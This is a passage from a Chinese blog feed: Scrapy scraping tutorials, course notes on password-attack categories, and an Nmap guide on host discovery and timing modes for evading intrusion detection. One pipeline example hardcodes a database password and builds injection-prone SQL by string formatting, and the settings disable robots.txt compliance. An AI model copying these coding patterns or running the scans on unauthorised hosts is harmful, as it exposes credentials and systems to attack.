    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ImagesPipeline</title>
    <link href="/2023/10/02/Python/Spider/Scrapy/ImagesPipeline/"/>
    <url>/2023/10/02/Python/Spider/Scrapy/ImagesPipeline/</url>
    
    <content type="html"><![CDATA[<h1 id="基于scrapy">1 基于scrapy</h1><ul><li>字符串：只需要基于xpath进行解析，提交管道进行持久化存储</li><li>图片：xpath解析出图片src属性值，再单独对该地址发送请求获取图片二进制类型的数据</li></ul><h1 id="imagespipeline">2 ImagesPipeline</h1><ul><li><p>只需解析出图片src属性值，提交给管道，管道就会对该地址进行请求并获得二进制响应数据</p></li><li><p>使用流程：</p><ul><li><p>数据解析（图片地址）</p></li><li><p>将item提交到管道</p></li><li><p>重写一个基于ImagesPipeline的一个管道类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><span class="hljs-keyword">from</span> scrapy.pipelines.images <span class="hljs-keyword">import</span> ImagesPipeline<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">imgsPipeline</span>(<span class="hljs-title class_ inherited__">ImagesPipeline</span>):<br>    <span class="hljs-comment"># 根据图片地址进行图片数据的请求</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_media_requests</span>(<span class="hljs-params">self, item, info</span>):<br>        <span class="hljs-keyword">yield</span> scrapy.Request(item[<span class="hljs-string">&#x27;src&#x27;</span>])<br><br>    <span class="hljs-comment"># 指定图片存储的路径</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">file_path</span>(<span class="hljs-params">self, request, response=<span class="hljs-literal">None</span>, info=<span class="hljs-literal">None</span>, *, item=<span class="hljs-literal">None</span></span>):<br>        imgName=request.url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">return</span> imgName<br><br>    <span class="hljs-comment"># 返回给下一个将要执行的管道</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">item_completed</span>(<span class="hljs-params">self, results, item, info</span>):<br>        <span class="hljs-keyword">return</span> item<br><br></code></pre></td></tr></table></figure></li><li><p>配置文件：指定图片存储位置(<code>IMAGES_STORE = ''</code>)；开启管道</p></li></ul></li></ul><h1 id="图片懒加载">3 图片懒加载</h1><ul><li>懒加载，即延迟加载(Lazyload)。简单来说就是一个长页面中需要展示很多图像的时候，如果在进入页面的时候一次性把所有图片加载完，需要很长的时间。为了提升用户体验，我们使用懒加载，当图片出现在浏览器可视区域时，才加载图片。</li><li>遇到此类情况，进行数据解析时需要使用伪属性</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>请求传参</title>
    <link href="/2023/10/01/Python/Spider/Scrapy/%E8%AF%B7%E6%B1%82%E4%BC%A0%E5%8F%82/"/>
    <url>/2023/10/01/Python/Spider/Scrapy/%E8%AF%B7%E6%B1%82%E4%BC%A0%E5%8F%82/</url>
    
    <content type="html"><![CDATA[<h1 id="使用场景">1 使用场景</h1><p>爬取解析的数据不在同一张页面中</p><h1 id="使用流程">2 使用流程</h1><ul><li>请求传参传的是item的对象</li><li><code>meta=&#123;'item':item&#125;</code>，可以将meta字典传递给请求对应的回调函数</li><li>回调函数接收item：<code>item=response.meta['item']</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BossSpider</span>(scrapy.Spider):<br>  name = <span class="hljs-string">&quot;boss&quot;</span><br>  <span class="hljs-comment"># allowed_domains = [&quot;zhipin.com&quot;]</span><br>  start_urls = [<span class="hljs-string">&quot;https://699pic.com/tupian/264659-1.html&quot;</span>]<br>  url=<span class="hljs-string">&quot;https://699pic.com/tupian/264659-%d.html&quot;</span><br>  page_num=<span class="hljs-number">2</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>      li_list=response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;wrapper&quot;]/div[4]/div/div&#x27;</span>)<br>      <span class="hljs-comment"># print(li_list)</span><br>      <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_list:<br>          pic_name=li.xpath(<span class="hljs-string">&#x27;./a/@title&#x27;</span>).get()<br>          pic_id_url=<span class="hljs-string">&quot;https://&quot;</span>+li.xpath(<span class="hljs-string">&#x27;./a/@href&#x27;</span>).get()<br>          item=BossproItem()<br>          item[<span class="hljs-string">&#x27;pic_name&#x27;</span>]=pic_name<br>          <span class="hljs-comment"># ！！！手动发送请求，meta请求传参</span><br>          <span class="hljs-keyword">yield</span> scrapy.Request(url=pic_id_url,callback=self.parse_detail,meta=&#123;<span class="hljs-string">&#x27;item&#x27;</span>:item&#125;)<br><br>      <span class="hljs-keyword">if</span> self.page_num &lt;= <span class="hljs-number">3</span>:<br>          new_url=<span class="hljs-built_in">format</span>(self.url%self.page_num)<br>          self.page_num+=<span class="hljs-number">1</span><br>          <span class="hljs-keyword">yield</span> scrapy.Request(url=new_url,callback=self.parse)<br><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">self,response</span>):<br>      <span class="hljs-comment"># 回调函数接收item</span><br>      item=response.meta[<span class="hljs-string">&#x27;item&#x27;</span>]<br>      <span class="hljs-comment"># print(item[&#x27;pic_name&#x27;])</span><br>      pic_id=response.xpath(<span class="hljs-string">&#x27;/html/body/div[12]/div[2]/div[1]/div/div[1]/div[1]/h1/span[2]/text()&#x27;</span>).get()<br>      item[<span class="hljs-string">&#x27;pic_id&#x27;</span>]=pic_id<br>      <span class="hljs-keyword">yield</span> item<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy持久化存储</title>
    <link href="/2023/09/30/Python/Spider/Scrapy/Scrapy%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8/"/>
    <url>/2023/09/30/Python/Spider/Scrapy/Scrapy%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="基于终端指令">1 基于终端指令</h1><ul><li>要求：只可以将parse方法的返回值存储到本地的文本文件</li><li>指令：<code>scrapy crawl spiderName -o filePath</code></li><li>注意：<ul><li>需在项目根目录下执行该命令</li><li>支持的文件格式：'json', 'jsonlines', 'jsonl', 'jl', 'csv', 'xml','marshal', 'pickle'</li></ul></li><li>优点：简介高效便捷</li><li>局限性较强（文件类型有限制）</li></ul><h1 id="基于管道">2 基于管道</h1><ul><li>编码流程：<ol type="1"><li>数据解析</li><li>item类中定义相关属性</li><li>将解析的数据封装为item类型的对象</li><li>提交item类型的对象给管道（先给优先级最高的管道，管道内依次传递），进行持久化存储</li><li>process_item对item类型对象进行处理</li><li>配置文件中开启管道</li></ol></li><li>优点：通用性强</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爬虫文件</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>li_list = response.xpath(<span class="hljs-string">&quot;/html/body/div[8]/ul/li&quot;</span>)<br>            <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_list:<br>            name = li.xpath(<span class="hljs-string">&quot;./a/b/text()&quot;</span>).extract_first()  <span class="hljs-comment"># extract_first()提取第一项，没有则返回None</span><br>            category = li.xpath(<span class="hljs-string">&quot;./em/a/text()&quot;</span>).extract_first()<br>            time = li.xpath(<span class="hljs-string">&quot;./em/text()&quot;</span>).extract_first()<br>            <span class="hljs-comment"># 创建item对象</span><br>            item=GameItem()<br>            item[<span class="hljs-string">&#x27;name&#x27;</span>]=name<br>            item[<span class="hljs-string">&#x27;category&#x27;</span>]=category<br>            item[<span class="hljs-string">&#x27;time&#x27;</span>]=time<br>            <span class="hljs-comment"># 向管道提交item</span><br>            <span class="hljs-keyword">yield</span> item<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><span class="hljs-comment"># 数据库存储</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySQLPipeline</span>:<br>    coon=<span class="hljs-literal">None</span><br>    cursor=<span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 重写父类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_spider</span>(<span class="hljs-params">self, item</span>):        self.coon=pymysql.Connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,port=<span class="hljs-number">3306</span>,user=<span class="hljs-string">&#x27;root&#x27;</span>,password=<span class="hljs-string">&quot;20030227XKY&quot;</span>,db=<span class="hljs-string">&quot;spider_learning&quot;</span>,charset=<span class="hljs-string">&quot;utf8mb4&quot;</span>)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        self.cursor=self.coon.cursor()<br>        <span class="hljs-keyword">try</span>:<br>            self.cursor.execute(<span class="hljs-string">&#x27;insert into game_info values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;)&#x27;</span>%(item[<span class="hljs-string">&#x27;name&#x27;</span>],item[<span class="hljs-string">&#x27;category&#x27;</span>],item[<span class="hljs-string">&#x27;time&#x27;</span>],item[<span class="hljs-string">&#x27;test&#x27;</span>]))<br>            self.coon.commit()<br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.coon.rollback()<br><br>        <span class="hljs-keyword">return</span> item  <span class="hljs-comment"># 传递给下一个管道</span><br><br>    <span class="hljs-comment"># 重写父类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close_spider</span>(<span class="hljs-params">self, item</span>):<br>        self.cursor.close()<br>        self.coon.close()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy基本使用与介绍</title>
    <link href="/2023/09/29/Python/Spider/Scrapy/Scrapy%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E4%B8%8E%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/09/29/Python/Spider/Scrapy/Scrapy%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E4%B8%8E%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫工程化">1 爬虫工程化</h1><p>对爬虫的功能进行模块化开发，从而达到可以批量生产的效果。</p><h1 id="scrapy简介">2 Scrapy简介</h1><p>Scrapy是一个快速、高效率的网络爬虫框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy被广泛用于数据挖掘、监测和自动化测试。</p><p>官方文档：<ahref="https://docs.scrapy.org/en/latest/index.html">Scrapy 2.11documentation — Scrapy 2.11.0 documentation</a></p><h1 id="scrapy工作流程">3 Scrapy工作流程</h1><p><strong>基本爬虫工作流程：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201611.png"alt="image-20230929093956527" /><figcaption aria-hidden="true">image-20230929093956527</figcaption></figure><p><strong>Scrapy框架工作流程：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201612.png"alt="image-20230929093846194" /><figcaption aria-hidden="true">image-20230929093846194</figcaption></figure><ol type="1"><li>引擎：用来处理整个系统的数据流，触发事务。（核心）</li><li>spider（将url封装成request对象，发送给scheduler）</li><li>scheduler（得到request对象，进行过滤，压入队列，发送给downloader）</li><li>downloader（发送请求，将响应封装成response对象，传递给spider）</li><li>spider（进行数据解析）注：若还需要继续爬取，则重复前面几个步骤</li><li>pipeline（数据持久化存储）</li><li>下载器中间件、爬虫中间件</li></ol><h1 id="scrapy安装">4 Scrapy安装</h1><p>使用Anaconda Navigator创建虚拟环境，导入Scrapy包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201614.png"alt="image-20230929100319426" /><figcaption aria-hidden="true">image-20230929100319426</figcaption></figure><p>若终端能打印版本号，则说明已安装成功。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201615.png"alt="image-20230929100251091" /><figcaption aria-hidden="true">image-20230929100251091</figcaption></figure><h1 id="scrapy实例">5 Scrapy实例</h1><h2 id="创建项目">5.1 创建项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># projectName自取，后续操作均在生成的项目根目录下进行</span><br>scrapy startproject projectName<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201616.png"alt="image-20230929101145588" /><figcaption aria-hidden="true">image-20230929101145588</figcaption></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看项目根目录下目录结构</span><br>tree /f<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201617.png"alt="image-20230929102306107" /><figcaption aria-hidden="true">image-20230929102306107</figcaption></figure><h2 id="生成爬虫">5.2 生成爬虫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># spiderName,allowed_domains按需设置</span><br>scrapy genspider spiderName allowed_domains<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309291201618.png"alt="image-20230929103444499" /><figcaption aria-hidden="true">image-20230929103444499</figcaption></figure><h2 id="运行项目">5.3 运行项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># spiderName为前面设置的爬虫名字</span><br>scrapy crawl spiderName<br></code></pre></td></tr></table></figure><h2 id="配置项目">5.4 配置项目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># settings.py</span><br><br><span class="hljs-comment"># UA伪装，默认没有开启</span><br>USER_AGENT = <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43&quot;</span><br><br><span class="hljs-comment"># 修改值为False，不遵从robots协议，默认值为Ture</span><br>ROBOTSTXT_OBEY = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 设置日志级别：DEBUG、INFO、WARNING、ERROR、CRITCAL</span><br><span class="hljs-comment"># 需要自己在配置文件中添加</span><br>LOG_LEVEL = <span class="hljs-string">&quot;WARNING&quot;</span><br><br><span class="hljs-comment"># 开启管道，默认被注释</span><br><span class="hljs-comment"># key 管道路径</span><br><span class="hljs-comment"># value 管道优先级（数字越小，优先级越高）</span><br>ITEM_PIPELINES = &#123;<br>   <span class="hljs-string">&quot;game.pipelines.GamePipeline&quot;</span>: <span class="hljs-number">300</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="基本流程">6 基本流程</h1><ol type="1"><li>创建项目</li><li>进入项目根目录</li><li>创建爬虫</li><li>修改start_urls</li><li>编写parse(self, response)<ul><li>默认xpath()返回Selector对象，需要进行数据提取。注意：<strong>xpath中不能有tbody标签</strong><ul><li>extract()：返回列表</li><li>extract_first()：返回第一个数据</li></ul></li><li>yield item</li></ul></li><li>在pipeline中完成数据存储</li><li>配置文件中启用管道</li><li>运行爬虫</li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH3-口令攻击</title>
    <link href="/2023/09/28/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/03%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/"/>
    <url>/2023/09/28/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/03%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="概述">3.1 概述</h1><h2 id="口令和身份认证">3.1.1 口令和身份认证</h2><ul><li><p>身份认证：用户向计算机系统以一种安全的方式提交自己的身份证明，然后由系统确认用户的身份是否属实，最终拒绝用户或者赋予用户一定的权限。</p></li><li><p>口令认证是身份认证的一种手段。</p></li><li><p>其他认证方式：磁卡或者智能卡认证、基于人的生理特征认证、基于地理位置的认证 。</p></li><li><p>认证过程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281533483.png"alt="image-20230928144139441" /><figcaption aria-hidden="true">image-20230928144139441</figcaption></figure></li></ul><h2 id="口令攻击的分类">3.1.2 口令攻击的分类</h2><ul><li>口令分类：<ul><li>静态口令</li><li>动态口令：加入不确定因子进行散列</li></ul></li><li>口令攻击分类：<ul><li>针对口令强度的攻击</li><li>针对口令存储的攻击：文件、缓存、数据库</li><li>针对口令传输的攻击：在口令认证交互过程中，利用网络监听非法得到用户传送的口令</li></ul></li></ul><h1 id="针对口令强度的攻击">3.2 针对口令强度的攻击</h1><h2 id="强口令与弱口令">3.2.1 强口令与弱口令</h2><ul><li>较为安全的口令应该不容易被发现规律，并且有足够的长度。</li><li>对长度的要求随应用环境的不同而不同，应该使得攻击者在某个时间段内很难破解</li></ul><h2 id="针对口令强度的攻击-1">3.2.2 针对口令强度的攻击</h2><ul><li><p>强力攻击：穷举法</p></li><li><p>字典攻击：将使用概率较高的口令集中存放在字典文件中，通过不同的变异规则生成猜测字典。强力攻击的进阶版。</p></li><li><p>组合攻击：强力攻击+字典攻击。如：字典单词尾部串接任意个字母和数字。</p></li><li><p>撞库攻击：攻击者通过收集在网络上已泄露的用户名、口令等信息，之后用这些账号和口令尝试批量登录其他网站，最终得到可以登录这些网站的用户账号和口令。一般流程：拖库→洗库→撞库。</p></li><li><p>彩虹表破解：指拿着获取到的hash值通过查询彩虹表找出其原始值的攻击方式。狭义上，彩虹表一般是指以“hash值:原始值”为行组成的文件，如下图所示。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281533484.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure></li></ul><h1 id="针对口令存储的攻击">3.3 针对口令存储的攻击</h1><ul><li><p>不同系统的口令存储位置不同，有些存放在文件中，比如Linux系统的Shadow文件，Windows系统的SAM文件；有些存放在数据库中，比如Oracle数据库账户文件；有些则存放在注册表中，比如Windows平台下的许多应用软件。另外，在身份验证程序运行时，还会将口令或口令的密文加载到内存中，方便进行比较。</p></li><li><p>Linux shadow文件：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281535352.png"alt="image-20230928153443475" /><figcaption aria-hidden="true">image-20230928153443475</figcaption></figure></li><li><p>salt用途：使用salt时，相同的输入可能导致不同的散列。密码散列=单向散列循环（密码||随机字符串）。可以防止字典攻击、彩虹表攻击。</p></li></ul><h1 id="针对口令传输的攻击">3.4 针对口令传输的攻击</h1><h2 id="口令嗅探">3.4.1 口令嗅探</h2><ul><li>如果主机B处于主机A和FTP通信的信道上，就可以“窃听到”合法的用户名及口令。</li><li>802.3以太网是一种使用广播信道的网络，在以太网中所有通信都是广播的。</li><li>网卡侦听模式：<ul><li>广播模式</li><li>组播模式</li><li>普通模式</li><li><strong>混杂模式</strong></li></ul></li></ul><h2 id="键盘记录">3.4.2 键盘记录</h2><ul><li>硬件截获：修改主机的键盘接口。</li><li>软件截获：监视操作系统处理键盘输入的接口，将来自键盘的数据记录下来。</li></ul><h2 id="网络钓鱼">3.4.3 网络钓鱼</h2><p>“网络钓鱼（Phishing）”就是攻击者利用欺骗性的电子邮件和伪造的Web站点，骗取用户输入口令以及其他身份敏感信息。</p><h2 id="重放攻击">3.4.4 重放攻击</h2><ul><li>指攻击者记录下当前的通讯流量，以后在适当的时候重发给通讯的某一方，达到欺骗的目的。</li><li>分类：简单重放、反向重放。</li></ul><p>参考教程：</p><ol type="1"><li>https://www.cnblogs.com/lsdb/p/10038835.html</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nmap扫描工具基础</title>
    <link href="/2023/09/28/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E5%AE%9E%E9%AA%8C%E7%AF%87/Nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/09/28/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E5%AE%9E%E9%AA%8C%E7%AF%87/Nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">1 简介</h1><h2 id="概述">1.1 概述</h2><p><code>Nmap</code>（“ Network Mapper”）是一个用于网络探测和安全审计的开源工具。它被设计用于快速扫描大型网络，尽管它对于单个主机也能正常工作。<code>Nmap</code>以新颖的方式使用原始<code>IP</code>数据包来确定网络上可用的主机、这些主机提供的服务（应用程序名称和版本）、它们运行的操作系统及其版本、正在使用中的数据包过滤器/防火墙的类型，以及数十个其他特性。</p><h2 id="功能">1.2 功能</h2><ul><li>主机发现</li><li>端口扫描</li><li>服务和版本检测</li><li>推断主机所用的操作系统</li></ul><h2 id="常见用法">1.3 常见用法</h2><ul><li><p><code>-iL</code> <inputfilename>(从列表中输入)：可将文件中的一堆主机名或地址读取出来进行扫描。</p></li><li><p><code>-iR</code> <hostnum>(随机选择目标)：可以指定随机生成多少个<code>IP</code>地址。如果为0，意味着无休止的扫描。</p></li><li><p><code>–exclude</code>：可以排除多个不需要扫描的主机。</p></li><li><p><code>–excludfile</code> <excludefile>(排除文件中的列表)：排除文件中的主机列表</p></li></ul><h2 id="时序">1.4 时序</h2><ul><li>-T0 偏执的：非常非常慢，用于IDS逃逸</li><li>-T1 猥琐的：相当慢，用于IDS逃逸</li><li>-T2 有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</li><li>-T3 普通的：默认，根据目标的反应自动调整时间模式</li><li>-T4 野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</li><li>-T5 疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</li></ul><h1 id="主机发现">2 主机发现</h1><p><code>Nmap</code>会根据当前扫描的网络来改变它的扫描方式：</p><ul><li>本地网络发送 <code>ARP</code>数据包；</li><li>非本地网路依次发送：A) <code>ICMP echo</code>请求；B)<code>TCP SYN</code> 到端口 443；C) <code>TCP ACK</code>到端口 80；D)<code>ICMP timestap</code>请求。</li></ul><h2 id="sl列表扫描">2.1 -sL(列表扫描)</h2><p>列表扫描是主机发现的一种退化形式，它仅列出指定网络的每个主机，而不向目标主机发送任何数据包，即<strong>不进行主机发现</strong>。默认情况下，<code>Nmap</code>仍然在主机上执行<code>反向 DNS 解析</code>（<code>IP</code>→<code>域名</code>）以了解其名称。<code>Nmap</code>还在末尾报告<code>IP</code>地址的总数。由于这个想法是简单地打印目标主机列表，因此端口扫描、操作系统检测或主机发现等更高级别功能的选项不能与此结合。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048776.png"alt="image-20230924112236211" /><figcaption aria-hidden="true">image-20230924112236211</figcaption></figure><h2 id="sn无端口扫描">2.2 -sn(无端口扫描)</h2><p>该选项告诉<code>Nmap</code>在主机发现后不要进行端口扫描，而只打印出响应主机发现探测的可用主机。默认情况下，完成的默认主机发现<code>-sn</code>由<code>ICMP</code> 回显请求、端口 443 的<code>TCP SYN</code>、端口 80的<code>TCP ACK</code>以及<code>ICMP</code>时间戳请求组成。当由非特权用户执行时，仅将 SYN数据包发送（使用调用<code>connect</code>）到目标上的端口 80 和443。当特权用户尝试扫描本地以太网上的目标时，除非<code>--send-ip</code>指定，否则将使用<code>ARP</code>请求。该<code>-sn</code>选项可以与任何发现探测类型（<code>-P*</code>选项）以获得更大的灵活性。如果使用任何这些探测类型和端口号选项，则默认探测将被覆盖。当运行<code>Nmap</code>的源主机和目标网络之间存在严格的防火墙时，建议使用这些高级技术。否则，当防火墙丢弃探测或其响应时，主机可能会丢失。只利用ping扫描进行主机发现，不扫描目标主机的端口。在<code>Nmap</code>的早期版本中，<code>-sn</code>被称为<code>-sP</code>。·</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048778.png"alt="image-20230924114006070" /><figcaption aria-hidden="true">image-20230924114006070</figcaption></figure><h2 id="pn无-ping">2.3 -Pn(无 ping)</h2><p>该选项完全跳过主机发现阶段。通常情况下，<code>Nmap</code>使用此阶段来确定活动机器，以便进行更大规模的扫描，并衡量网络速度。与列表扫描一样，会跳过正确的主机发现，但<code>Nmap</code>不会停止并打印目标列表，而是继续执行请求的功能，就好像每个目标<code>IP</code>都处于活动状态一样。默认情况下，<code>Nmap</code>只对发现运行的主机执行重型探测，如端口扫描、版本检测或操作系统检测。对于本地以太网上的机器，仍然会执行<code>ARP</code> 扫描（除非指定<code>--disable-arp-ping</code>或<code>--send-ip</code>），因为<code>Nmap</code>需要 MAC 地址来进一步扫描目标主机。在<code>Nmap</code>的早期版本中，<code>-Pn</code>是 <code>-P0</code> 和<code>-PN</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048779.png"alt="image-20230925152253035" /><figcaption aria-hidden="true">image-20230925152253035</figcaption></figure><h2 id="ps-tcp-syn-ping">2.4 -PS <port list>(TCP SYN Ping)</h2><p>该选项会发送一个设置了<code>SYN</code>标志的空 TCP数据包。默认目标端口为 80。SYN标志向远程系统表明，您正试图建立连接。通常情况下，目标端口会被关闭，并回发一个<code>RST</code>（重置）数据包。如果端口碰巧是开放的，目标系统将采取TCP 三方握手的第二步，回应一个 <code>SYN/ACK</code> TCP数据包。然后，运行 <code>Nmap</code> 的机器会以 <code>RST</code>回应，而不是发送 <code>ACK</code>数据包（<code>ACK</code>数据包将完成三方握手并建立完整连接）来破坏新生连接。<code>Nmap</code>不关心端口是打开还是关闭。前面讨论的 <code>RST</code> 